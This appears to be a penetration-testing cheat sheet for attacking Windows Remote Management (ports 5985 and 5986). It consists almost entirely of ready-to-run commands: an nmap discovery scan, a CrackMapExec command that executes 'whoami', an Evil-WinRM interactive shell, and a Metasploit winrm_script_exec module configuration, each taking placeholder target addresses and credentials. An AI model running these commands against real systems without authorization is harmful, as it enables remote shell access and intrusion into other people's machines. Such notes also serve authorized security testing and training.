# WinRM (TCP/5985, 5986)

## Discovery

nmap -sV -p 5985,5986 <TARGET_IP>
CrackMapExec quick checks

crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "whoami"
Evil-WinRM shell

evil-winrm -i <TARGET_IP> -u <USER> -p '<PW>'
Metasploit exec

use exploit/windows/winrm/winrm_script_exec
set RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true
run
